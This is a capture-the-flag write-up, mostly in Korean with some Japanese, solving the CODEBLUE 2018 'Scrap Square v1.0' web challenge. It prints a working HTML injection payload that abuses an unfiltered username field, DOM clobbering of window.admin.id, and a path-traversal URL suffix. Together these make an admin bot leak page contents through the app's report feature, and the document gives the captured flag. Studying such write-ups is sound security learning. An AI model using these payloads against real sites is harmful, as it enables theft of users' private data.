# CODEBLUE CTF 2018 Quals

## Scrap Square v1.0

### Description

Kamogawa created an application to record memo and he stored a secret memo.
He showed it to Katsuragawa and he learned CSP is cool.
If you find a issue, please report it.

URL: <http://v10.scsq.task.ctf.codeblue.jp:3000/>
Admin browser: Chromium 69.0.3494.0
Source code: [src-v1.0.zip](https://static.score.ctf.codeblue.jp/attachments/1/src-v1-5260287df18c8e0bc863f469d97b8d8d1b8e525bccdb822f1ac51f7d236ecc98.0.zip)
Admin browser: [admin.zip](https://static.score.ctf.codeblue.jp/attachments/1/admin-02a631c6efac7c8a14503e8a9ec714a5b4b4ec448b2b4eaf329fbf650fdf092d.zip)

### Exploit

문제의 설명에서 써있듯이 페이지에는 CSP가 걸려있으며, 목적은 관리자의 게시글(스크랩)을 얻어오는 것이라는 것을 알 수 있다.

問題の説明で書いているようにページには、CSPがかかっており、目的はADMINのスクラップを得てくることを知ることができる。

우선 어떤 CSP가 적용되어 있는지 보자.

まず、どんなCSPがかかっているか見てみよう。

```
default-src 'none';      
script-src 'self' https://stackpath.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js https://code.jquery.com/jquery-3.3.1.min.js http://www.google.com/recaptcha/api.js https://www.gstatic.com/recaptcha/;      
style-src 'self' https://stackpath.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css;      img-src 'self';      
frame-src https://www.google.com/recaptcha/;      
connect-src 'self'
```

이제 문제의 기능들을 하나하나 봐보자.

さて、問題の機能を見てみよう。

1. 사용자는 아이디를 생성할 수 있다.
   ユーザーのIDを生成する。
2. 로그인 한 사용자는 글을 작성할 수 있다.
   ログインしたユーザーは、スクラップをすることができる。
3. 작성된 글을 신고하면 관리자는 이를 읽는다.
   

uid(join시 랜덤 생성)폴더 아래에 작성한 글 제목을 파일 이름으로 하여 글 내용을 저장한다.

주소(경로)만 안다면 타 사용자의 글 또한 읽을 수 있다.

다만 글 내용이나 글 제목은 다음의 필터링이 적용되어 있다.

```javascript
const isTitleValid = (title) => {
  const errors = []
  if (title.length > 30) {
    errors.push('Title length should be less than 30')
  }
  if (/[^0-9a-zA-Z '.]/.test(title)) {
    errors.push('You cannot use unsafe character')
  }
  return {
    success: errors.length === 0,
    errors
  }
}
const isBodyValid = (body) => {
  const errors = []
  if (/[^0-9a-zA-Z '.\n\r/-]/.test(body)) {
    errors.push('You cannot use unsafe character')
  }
  return {
    success: errors.length === 0,
    errors
  }
}
```

즉, 파일 이름의 경우 javascript파일로 만들 수는 있지만, 우리가 원하는 행위를 하는 javascript코드를 만들기가 어렵다는 것을 알 수 있다.

```javascript
app.post('/register', async (req, res) => {
  const errors = []
  if (req.body.name.length > 300) {
    errors.push('Username should be less than 300')
  }
  if (errors.length > 0) {
    return res.render('register', { errors })
  }

  const uid = await generateUid(db)
  try {
    await db.run(
      'insert into users (uid, name, password) values (?, ?, ?)',
      uid, req.body.name, hashPassword(req.body.password)
    )

    // create user directory
    const dirname = path.join(rawStaticDir, uid)
    fs.mkdirSync(dirname)

    res.redirect('/')
  } catch (err) {
    errors.push(err)
    return res.render('register', { errors })
  }
})
```

위의 코드는 회원가입할 때의 실행하는 코드인데, 이를 보면 알듯이 이름에 관해서는 필터링을 하지 않는다.

제목을 통해 스크립트를 삽입할 수 있다.

하지만, CSP 정책에 의해 *\<script\>alert(1);\</script\>* 과 같은 형태를 사용할 수 없으므로 다른 방법을 사용해야 한다.

문제 페이지의 소스코드를 보면 주석이 되어 있는 내용을 볼 수 있다.

```html
<!-- auto report feature is disabled now--><!-- script(src='/static/javascripts/periodically-watch-scrap-body-and-report-scrap-automatically-with-banword.js')-->
```

주석 처리된 javascript파일은 다음과 같다.

```javascript
const timer = setInterval(() => {
  if ($('.scrap-body').length === 0) {
    return;
  }

  clearInterval(timer)
  if ($('.scrap-body').text().includes(window.banword || '')) {
    reportScrap()
  }
}, 300)
```

자동으로 report하는 기능을 가진 js파일이다.

```javascript
app.post('/report', async (req, res) => {
  const doReport = async () => {
    if (!req.body.url.startsWith(config.serverUrl)) {
      res.json({ success: false })
      return
    }

    try {
      await db.run(
        'insert into reports (uid, url, title, body) values (?, ?, ?, ?)',
        req.body.to, req.body.url, req.body.title, req.body.body
      )
    } catch (err) {
      return res.json({ success: false })
    }
    res.json({ success: true })
  }

  // only admin can bypass recaptcha
  if (req.session.user.uid === 'admin') {	// <-- Trigger Point
    await doReport()
  } else {
    // check captcha
    recaptcha.verify(req, async (error, data) => {
      if (error) {
        res.json({ success: false })
      } else {
        await doReport()
      }
    })
  }
})
```

서버에서 report를 처리하는 로직이다.

특이한 점이 하나 있다면 uid가 admin일 경우 captcha인증을 하지않고 report를 하며, report 받은 내역은 /report 페이지에서 json형태로 볼 수 있다.

이로써 우리는 자동 report 스크립트를 이용하여 admin이 우리에게 report하게 만드는 문제임을 알 수 있다.

report를 수행하는 reportScrap코드를 보면 다음과 같다.

```javascript
// report-scrap.js
window.reportScrap = (captcha) => {
  return $.post('/report', {
    to: window.admin.id,
    url: location.href,
    'g-recaptcha-response': captcha,
    title: $('.scrap-title').text(),
    body: $('.scrap-body').text()
  })
}
```

window.admin.id에게 url을 전송하며, 그때 title과 body의 내용또한 같이 받아온다.

window.admin.id를 우리의 uid로 바꾸면 해결될 것이지만, 이 값은 `config.js`에서 처리한다.

```javascript
window.admin = {
  id: 'admin'
}
window.banword = 'give me flag'
```

글 내용으로 javascript코드를 작성할 수 있는데, 필터링을 우회하여 **window.admin.id**를 선언할 방법을 찾지 못하였다.

여기서 ***form***을 이용하여 **window.admin.id**선언이 가능하다.

```html
<form name="admin" id="shpik"></form>
<script>
	console.log(window.admin.id);	// <-- shpik
	window.amdin.id='admin';
	console.log(window.admin.id);	// <-- admin
</script>
```

이를 이용하여 다음과 같은 스크립트 쿼리(총 299자)를 만들 수 있다.

```html
<script src=/static/javascripts/load-scrap.js></script><script src=/static/javascripts/report-scrap.js></script><form name=admin id=[uid] class=scrap-body>give me flag</form><script src=/static/javascripts/periodically-watch-scrap-body-and-report-scrap-automatically-with-banword.js></script><!--
```

이를 이름으로써 아이디(최대 300자까지 가능)를 생성하고, 해당 아이디로 작성된 글을 열람 시 auto report기능이 작동해 우리가 삽입한 uid로 report가 되는 것을 알 수 있다.

이제 admin의 계정에서 무언가를 탈취해야하는데, Cookie의 경우 **HTTP-ONLY**이기 때문에 하이재킹이 불가능하다.

그리하여 Cookie가 아닌 페이지의 내용을 추출할 것인데, 게시물 보는 페이지에서 취약점이 발생한다.

```javascript
// load-scrap.js
const urls = location.href.split('/')
const user = urls[urls.length - 2]
const title = urls[urls.length - 1]

// show title
const scrapTitle = $('<h1 class="scrap-title">')
scrapTitle.text(title)
$('.scrap-header').append(scrapTitle)

// show body
$.get(`/static/raw/${user}/${title}`)
  .then(c => {
    const scrapBody = $('<pre class="scrap-body">')
    scrapBody.text(c)
    $('.scrap-wrapper').append(scrapBody)
  })
```

위의 자바스크립트 파일을 보면 url에 대하여 검증을 하지않으므로, user와 title의 변수가 ..이 들어가게 되면 $.get함수를 통해 긁어오는 파일이 / (메인 페이지)가 된다.

메인 페이지에는 우리가 작성한 글과 글에대한 주소가 적혀 있으므로, report할 때 해당 내용에 body부분에 적혀서 전송이 된다.

user와 title을 .. 으로 만드는 방법은 간단하게 url뒤에 `?/../..` 또는 `#/../..` 을 붙이면 된다.



최종 공격 시나리오는 다음과 같다.

1. shpik (결과를 받을 id)를 생성하여 uid(e.g. SHSHSHSHSH) 획득

2. 다음의 스크립트로 아이디를 생성

   ```html
   <script src=/static/javascripts/load-scrap.js></script><script src=/static/javascripts/report-scrap.js></script><form name=admin id=SHSHSHSHSH class=scrap-body>give me flag</form><script src=/static/javascripts/periodically-watch-scrap-body-and-report-scrap-automatically-with-banword.js></script><!--
   ```

3. 2번에서 가입한 아이디로 임의의 글을 작성

4. 작성한 글의 url뒤에 `?/../..` 을 삽입하여 report!

5. Profit!



위의 시나리오대로 우리가 report를 수행하면 서버에서 auto report가 작동하여 shpik이라는 계정으로 report된 것을 확인할 수 있다.

```json
{"reports":[{"url":"http://v10.scsq.task.ctf.codeblue.jp:3000/scraps/z3uoyyvo/1?/../..","title":"","body":"give me flag<!DOCTYPE html><html lang=\"en\"><head><meta charset=\"UTF-8\"><title></title><link rel=\"stylesheet\" href=\"https://stackpath.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css\" integrity=\"sha384-WskhaSGFgHYWDcbwN70/dfYBj47jz9qbsMId/iRN3ewGhXQFZCSftd1LZCfmhktB\" crossorigin=\"anonymous\"><link rel=\"stylesheet\" href=\"/static/app.css\"><script src=\"https://code.jquery.com/jquery-3.3.1.min.js\" integrity=\"sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8=\" crossorigin=\"anonymous\"></script><script src=\"https://stackpath.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js\" integrity=\"sha384-smHYKdLADwkXOn1EmN1qk/HfnUcbVRZyYmZ4qpPea6sjB/pTJ0euyQp0Mk8ck+5T\" crossorigin=\"anonymous\"></script></head><body><header><nav class=\"navbar navbar-dark bg-dark navbar-expand-lg\"><ul class=\"navbar-nav mr-auto\"><li class=\"nav-item\"><a class=\"nav-link\" href=\"/\">Top</a></li><li class=\"nav-item\"><a class=\"nav-link\" href=\"/new\">New Scrap</a></li><li class=\"nav-item\"><a class=\"nav-link\" href=\"/logout\">Logout</a></li></ul></nav></header><main class=\"py-5 bg-light\" role=\"main\"><div class=\"container\"><div class=\"row\"><div class=\"col-md-4\"><a class=\"scraps-item\" href=\"scraps/admin/91510540-f090-4399-bad5-351e719686b5\">91510540-f090-4399-bad5-351e719686b5</a></div></div></div></main></body></html>"}]}
```

내용을 보면 flag가 **scraps/admin/91510540-f090-4399-bad5-351e719686b5**에 있다는 것을 알 수 있고, 해당 페이지에 들어가게되면 플래그를 얻을 수 있다.



FLAG : CBCTF{k475ur464w4-15_4-n4m3-0f_R1v3r}



